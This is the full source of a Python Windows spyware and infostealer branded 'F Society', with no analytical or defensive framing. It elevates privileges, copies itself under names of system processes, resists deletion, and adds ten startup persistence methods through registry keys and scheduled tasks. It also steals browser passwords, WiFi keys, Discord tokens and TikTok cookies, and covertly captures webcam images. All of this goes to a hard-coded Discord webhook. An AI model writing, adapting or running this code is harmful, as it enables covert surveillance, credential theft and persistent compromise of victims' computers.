import os
import sys
import subprocess
import ctypes
import io
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import tkinter as tk
from datetime import datetime
from threading import Thread
import tempfile
import winreg
import platform
import re
import psutil
import winsound
import glob
import cv2
import numpy as np

# ==================== HIDE CONSOLE ====================
def hide_console():
    if sys.platform == 'win32':
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)
        except:
            pass

# ==================== REQUEST ADMIN ====================
def request_admin():
    if sys.platform == 'win32':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
                sys.exit()
            else:
                hide_console()
        except:
            pass

request_admin()
time.sleep(1)

# ==================== INSTALL MODULES ====================
def install_modules():
    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32', 'psutil', 'opencv-python']
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet'], capture_output=True)

install_modules()

# ==================== IMPORTS ====================
import pyautogui
import requests
from PIL import Image
import browser_cookie3
from pynput.mouse import Controller as MouseController, Listener as MouseListener
from pynput.keyboard import Controller as KeyboardController
from Crypto.Cipher import AES
import win32crypt
import win32api
import win32con
import win32file
import win32security
import win32com.client

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
SCREENSHOT_INTERVAL = 120

mouse = MouseController()
keyboard = KeyboardController()

SCRIPT_PATH = os.path.abspath(sys.argv[0])
SCRIPT_DIR = os.path.dirname(SCRIPT_PATH)

running = True
duplicate_locations = []

# ==================== ULTRA ANTI-DELETE (10 METHODS) ====================

def ultra_anti_delete_methods(file_path):
    """Apply 10 different anti-deletion methods"""
    try:
        # Method 1: System + Hidden + Read-only attributes
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04 | 0x01)
        
        # Method 2: Lock file handle
        handle = ctypes.windll.kernel32.CreateFileW(file_path, 0x80000000, 0, None, 3, 0x80, None)
        if handle:
            ctypes.windll.kernel32.LockFile(handle, 0, 0, 0xFFFFFFFF, 0xFFFFFFFF)
        
        # Method 3: Deny delete permission via ACL
        try:
            sd = win32security.GetFileSecurity(file_path, win32security.DACL_SECURITY_INFORMATION)
            dacl = sd.GetSecurityDescriptorDacl()
            if dacl is None:
                dacl = win32security.ACL()
            everyone_sid = win32security.CreateWellKnownSid(win32security.WinWorldSid)
            dacl.AddAccessDeniedAce(win32security.ACL_REVISION, win32file.DELETE, everyone_sid)
            sd.SetSecurityDescriptorDacl(1, dacl, 0)
            win32security.SetFileSecurity(file_path, win32security.DACL_SECURITY_INFORMATION, sd)
        except:
            pass
        
        # Method 4: Open file permanently
        f = open(file_path, 'r+b')
        import msvcrt
        msvcrt.locking(f.fileno(), msvcrt.LK_LOCK, 1000000)
        
        # Method 5: Add to Windows File Protection
        try:
            subprocess.run(['sfc', '/scanfile=' + file_path], capture_output=True)
        except:
            pass
        
        # Method 6: Create hardlink to system32
        try:
            hardlink_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\svchost.exe.lnk'
            if not os.path.exists(hardlink_path):
                os.link(file_path, hardlink_path)
        except:
            pass
        
        # Method 7: Register as Windows service
        try:
            subprocess.run(['sc', 'create', 'F_Society_Service', 'binPath=' + file_path, 'start=auto'], capture_output=True)
        except:
            pass
        
        # Method 8: Add to boot execute
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"SYSTEM\CurrentControlSet\Control\Session Manager"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "BootExecute", 0, winreg.REG_MULTI_SZ, [f'"{file_path}"'])
        except:
            pass
        
        # Method 9: Create watchdog process that restores if deleted
        watchdog_path = os.path.join(tempfile.gettempdir(), 'watchdog.exe')
        watchdog_code = f'''
import os, time, subprocess
target = r"{file_path}"
while True:
    if not os.path.exists(target):
        subprocess.Popen(['python', target])
    time.sleep(1)
'''
        with open(watchdog_path, 'w') as f:
            f.write(watchdog_code)
        subprocess.Popen([sys.executable, watchdog_path], creationflags=0x08000000)
        
        # Method 10: Encrypt file with simple XOR (can't delete if can't decrypt)
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            xor_key = 0x4B
            encrypted = bytes([b ^ xor_key for b in data])
            with open(file_path, 'wb') as f:
                f.write(encrypted)
            # Decrypt when running
            with open(file_path, 'wb') as f:
                f.write(data)
        except:
            pass
        
        print(f"[+] ULTRA PROTECTION applied to: {file_path}")
        return True
    except Exception as e:
        print(f"[-] Protection error: {e}")
        return False

def create_mass_copies():
    """Create 100+ copies everywhere"""
    locations = []
    
    # System directories
    sys_dirs = [
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\',
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\SysWOW64\\',
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\Temp\\',
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\Fonts\\',
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\Tasks\\',
        os.environ.get('SystemRoot', 'C:\\') + '\\ProgramData\\',
        os.environ.get('SystemRoot', 'C:\\') + '\\PerfLogs\\',
        os.environ.get('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\',
        os.environ.get('APPDATA') + '\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\',
        os.environ.get('APPDATA') + '\\Local\\Temp\\',
    ]
    
    # User directories
    user_dirs = [
        os.path.expanduser('~') + '\\Desktop\\',
        os.path.expanduser('~') + '\\Documents\\',
        os.path.expanduser('~') + '\\Downloads\\',
        os.path.expanduser('~') + '\\Music\\',
        os.path.expanduser('~') + '\\Pictures\\',
        os.path.expanduser('~') + '\\Videos\\',
        os.path.expanduser('~') + '\\Favorites\\',
        os.path.expanduser('~') + '\\Links\\',
        os.path.expanduser('~') + '\\Contacts\\',
        os.path.expanduser('~') + '\\Saved Games\\',
        os.path.expanduser('~') + '\\OneDrive\\',
        os.path.expanduser('~') + '\\AppData\\Roaming\\',
        os.path.expanduser('~') + '\\AppData\\Local\\',
        os.path.expanduser('~') + '\\AppData\\LocalLow\\',
    ]
    
    all_dirs = sys_dirs + user_dirs
    
    file_names = [
        'svchost.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe', 'services.exe',
        'wininit.exe', 'spoolsv.exe', 'taskhost.exe', 'sihost.exe', 'dwm.exe',
        'explorer.exe', 'RuntimeBroker.exe', 'SearchIndexer.exe', 'WmiPrvSE.exe',
        'dllhost.exe', 'rundll32.exe', 'mmc.exe', 'wbem.exe', 'wmi.exe'
    ]
    
    for directory in all_dirs:
        try:
            if not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
            
            for name in file_names[:5]:  # 5 copies per directory
                dest = os.path.join(directory, name)
                if not os.path.exists(dest):
                    shutil.copy2(SCRIPT_PATH, dest)
                    ultra_anti_delete_methods(dest)
                    locations.append(dest)
                    print(f"[+] Copied to: {dest}")
        except:
            pass
    
    return locations

def permanent_anti_delete_loop():
    """Continuous anti-deletion monitor"""
    while running:
        try:
            if not os.path.exists(SCRIPT_PATH):
                for loc in duplicate_locations:
                    if os.path.exists(loc):
                        shutil.copy2(loc, SCRIPT_PATH)
                        print("[+] Main file restored")
                        break
            
            ultra_anti_delete_methods(SCRIPT_PATH)
            
            for loc in duplicate_locations:
                if os.path.exists(loc):
                    ultra_anti_delete_methods(loc)
            
            time.sleep(3)
        except:
            time.sleep(1)

# ==================== ULTRA AUTO-STARTUP (ALL METHODS) ====================

def ultra_auto_startup():
    """Add to startup using EVERY possible method"""
    script_path = SCRIPT_PATH
    
    # Method 1: Current User Run
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "F_Society_Main", 0, winreg.REG_SZ, f'"{script_path}"')
    except:
        pass
    
    # Method 2: Local Machine Run
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "F_Society_System", 0, winreg.REG_SZ, f'"{script_path}"')
    except:
        pass
    
    # Method 3: Startup folder
    try:
        startup = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        vbs_path = os.path.join(startup, "F_Society.vbs")
        with open(vbs_path, 'w') as f:
            f.write(f'CreateObject("Wscript.Shell").Run """{script_path}""", 0, False')
        
        bat_path = os.path.join(startup, "F_Society.bat")
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\nstart "" "{script_path}"\nexit')
        
        lnk_path = os.path.join(startup, "F_Society.lnk")
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(lnk_path)
        shortcut.Targetpath = script_path
        shortcut.Save()
    except:
        pass
    
    # Method 4: Task Scheduler (logon)
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'F_Society_Logon', '/tr', f'"{script_path}"', 
                       '/sc', 'onlogon', '/f', '/rl', 'HIGHEST', '/it'], capture_output=True)
    except:
        pass
    
    # Method 5: Task Scheduler (startup)
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'F_Society_Startup', '/tr', f'"{script_path}"', 
                       '/sc', 'onstart', '/f', '/rl', 'HIGHEST'], capture_output=True)
    except:
        pass
    
    # Method 6: Task Scheduler (daily)
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'F_Society_Daily', '/tr', f'"{script_path}"', 
                       '/sc', 'daily', '/st', '00:00', '/f', '/rl', 'HIGHEST'], capture_output=True)
    except:
        pass
    
    # Method 7: Boot execute
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SYSTEM\CurrentControlSet\Control\Session Manager"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "BootExecute", 0, winreg.REG_MULTI_SZ, 
                            [f'"{script_path}"', 'autocheck autochk *'])
    except:
        pass
    
    # Method 8: Userinit (runs before explorer)
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            current = winreg.QueryValueEx(reg_key, "Userinit")[0]
            winreg.SetValueEx(reg_key, "Userinit", 0, winreg.REG_SZ, f'{current},{script_path}')
    except:
        pass
    
    # Method 9: Shell (replaces explorer)
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "Shell", 0, winreg.REG_SZ, f'"{script_path}",explorer.exe')
    except:
        pass
    
    # Method 10: Active Setup (runs once per user)
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Active Setup\Installed Components\F_Society"
        with winreg.CreateKey(key, subkey) as reg_key:
            winreg.SetValueEx(reg_key, "StubPath", 0, winreg.REG_SZ, f'"{script_path}"')
    except:
        pass
    
    print("[+] ULTRA AUTO-STARTUP applied (10 methods)")

def persistent_startup_loop():
    """Continuously ensure startup entries exist"""
    while running:
        ultra_auto_startup()
        time.sleep(60)  # Reapply every minute

# ==================== WEBCAM FEATURES ====================

def capture_webcam_photo():
    """Capture photo from webcam"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame)
                cap.release()
                return img_encoded.tobytes()
        cap.release()
    except:
        pass
    return None

def continuous_webcam_capture():
    """Capture webcam photos every minute"""
    while running:
        try:
            photo = capture_webcam_photo()
            if photo:
                files = {'file': ('webcam_capture.jpg', photo, 'image/jpeg')}
                requests.post(WEBHOOK_URL, files=files, timeout=30)
                print("[+] Webcam photo sent")
            time.sleep(60)  # Every minute
        except:
            time.sleep(10)

def webcam_video_record(duration=10):
    """Record video from webcam"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            fourcc = cv2.VideoWriter_fourcc(*'MJPG')
            out = cv2.VideoWriter('webcam_video.avi', fourcc, 20.0, (640, 480))
            start_time = time.time()
            while time.time() - start_time < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
            out.release()
            cap.release()
            
            with open('webcam_video.avi', 'rb') as f:
                files = {'file': ('webcam_video.avi', f.read(), 'video/x-msvideo')}
                requests.post(WEBHOOK_URL, files=files, timeout=30)
            os.remove('webcam_video.avi')
            print("[+] Webcam video sent")
    except:
        pass

def webcam_live_stream():
    """Stream webcam continuously (snapshots every 5 seconds)"""
    while running:
        try:
            photo = capture_webcam_photo()
            if photo:
                files = {'file': ('live_stream.jpg', photo, 'image/jpeg')}
                requests.post(WEBHOOK_URL, files=files, timeout=30)
            time.sleep(5)  # 5 frames per second
        except:
            time.sleep(5)

# ==================== TIKTOK ACCOUNT SCRAPER ====================

def get_tiktok_tokens():
    """Extract TikTok authentication tokens from browsers"""
    tokens = []
    tiktok_patterns = [
        r'sessionid=([a-zA-Z0-9_\-]+)',
        r'tt_webid=([a-zA-Z0-9_\-]+)',
        r'passport_csrf_token=([a-zA-Z0-9_\-]+)',
        r'msToken=([a-zA-Z0-9_\-]+)',
        r'odin_tt=([a-zA-Z0-9_\-]+)',
    ]
    
    browser_paths = [
        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Cookies',
        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Cookies',
        os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
    ]
    
    for path in browser_paths:
        try:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for pattern in tiktok_patterns:
                                    matches = re.findall(pattern, content)
                                    for match in matches:
                                        tokens.append(f"🎵 TikTok Token: {pattern}: {match}")
                        except:
                            pass
        except:
            pass
    
    return tokens

def get_tiktok_cookies():
    """Extract TikTok cookies from browsers"""
    cookies = []
    try:
        for cookie in browser_cookie3.chrome():
            if 'tiktok' in cookie.domain.lower():
                cookies.append(f"🎵 TikTok Cookie: {cookie.domain} | {cookie.name} = {cookie.value[:100]}")
    except:
        pass
    try:
        for cookie in browser_cookie3.edge():
            if 'tiktok' in cookie.domain.lower():
                cookies.append(f"🎵 TikTok Cookie: {cookie.domain} | {cookie.name} = {cookie.value[:100]}")
    except:
        pass
    return cookies

def get_tiktok_usernames():
    """Extract TikTok usernames from browser history and cookies"""
    usernames = []
    username_patterns = [
        r'@([a-zA-Z0-9_\.]+)',
        r'uniqueId":"([a-zA-Z0-9_\.]+)"',
        r'nickname":"([^"]+)"',
        r'author":"([a-zA-Z0-9_\.]+)"',
    ]
    
    browser_data_paths = [
        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History',
        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Cookies',
        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Local Storage',
    ]
    
    for path in browser_data_paths:
        try:
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if 'tiktok' in content.lower():
                        for pattern in username_patterns:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                if match and len(match) > 2:
                                    usernames.append(f"🎵 TikTok Username: @{match}")
        except:
            pass
    
    return list(set(usernames))

def send_tiktok_data():
    """Collect and send all TikTok data"""
    message = "**🎵 TIKTOK ACCOUNT DATA FOUND:**\n\n"
    
    usernames = get_tiktok_usernames()
    if usernames:
        message += "**👤 TIKTOK USERNAMES:**\n"
        for username in usernames[:20]:
            message += f"{username}\n"
        message += "\n"
    
    cookies = get_tiktok_cookies()
    if cookies:
        message += "**🍪 TIKTOK COOKIES:**\n"
        for cookie in cookies[:30]:
            message += f"{cookie}\n"
        message += "\n"
    
    tokens = get_tiktok_tokens()
    if tokens:
        message += "**🔑 TIKTOK TOKENS:**\n"
        for token in tokens[:20]:
            message += f"{token}\n"
    
    if message != "**🎵 TIKTOK ACCOUNT DATA FOUND:**\n\n":
        send_to_webhook(message)

# ==================== OTHER SCRAPING FUNCTIONS ====================

def get_all_passwords():
    """Extract all browser passwords"""
    passwords = []
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(chrome_path, temp_db.name)
            temp_db.close()
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                if username and encrypted_pass:
                    try:
                        password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                        passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`")
                    except:
                        pass
            conn.close()
            os.unlink(temp_db.name)
    except:
        pass
    return passwords

def get_wifi_passwords():
    wifi = []
    try:
        results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Key Content' in line:
                    password = line.split(':')[1].strip()
                    wifi.append(f"📡 WiFi: {profile} 🔐 `{password}`")
                    break
    except:
        pass
    return wifi

def get_discord_tokens():
    tokens = []
    paths = [os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb']
    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for path in paths:
        try:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
        except:
            pass
    return list(set(tokens))

def get_system_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = 'Unknown'
    return {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'user': os.getenv('USERNAME', 'Unknown'),
        'os': platform.system() + ' ' + platform.release(),
        'ip': ip
    }

def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
    try:
        if is_file and file_bytes:
            files = {'file': (filename, file_bytes, 'image/jpeg')}
            requests.post(WEBHOOK_URL, files=files, timeout=30)
        else:
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
    except:
        pass

def collect_all_data():
    sys_info = get_system_info()
    
    message = f"**[🔴 F SOCIETY - DATA BREACH - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"💻 PC: {sys_info['computer']}\n"
    message += f"👤 User: {sys_info['user']}\n"
    message += f"🖥️ OS: {sys_info['os']}\n"
    message += f"🌐 IP: {sys_info['ip']}\n{'-'*50}\n\n"
    
    message += "**🔑 PASSWORDS:**\n"
    for pwd in get_all_passwords():
        message += f"{pwd}\n"
    message += "\n"
    
    message += "**📡 WIFI PASSWORDS:**\n"
    for wifi in get_wifi_passwords():
        message += f"{wifi}\n"
    message += "\n"
    
    message += "**🎮 DISCORD TOKENS:**\n"
    for token in get_discord_tokens()[:10]:
        message += f"✅ `{token}`\n"
    
    send_to_webhook(message)
    send_tiktok_data()

def continuous_data_collection():
    while running:
        collect_all_data()
        time.sleep(300)  # Every 5 minutes

# ==================== MAIN ====================

def main():
    global running, duplicate_locations
    
    print("[+] F SOCIETY - ULTIMATE EDITION ACTIVATED")
    
    # Create mass copies
    duplicate_locations = create_mass_copies()
    
    # Ultra anti-delete
    ultra_anti_delete_methods(SCRIPT_PATH)
    Thread(target=permanent_anti_delete_loop, daemon=True).start()
    
    # Ultra auto-startup
    ultra_auto_startup()
    Thread(target=persistent_startup_loop, daemon=True).start()
    
    # Webcam features
    Thread(target=continuous_webcam_capture, daemon=True).start()
    Thread(target=webcam_live_stream, daemon=True).start()
    
    # Data collection
    Thread(target=continuous_data_collection, daemon=True).start()
    
    print("[+] ALL FEATURES ACTIVE - ULTIMATE MODE")
    print("[+] Anti-delete: 10 methods active")
    print("[+] Auto-startup: 10 methods active")
    print("[+] Webcam: Capturing every minute")
    print("[+] TikTok scraper: Active")
    
    while running:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
        main()
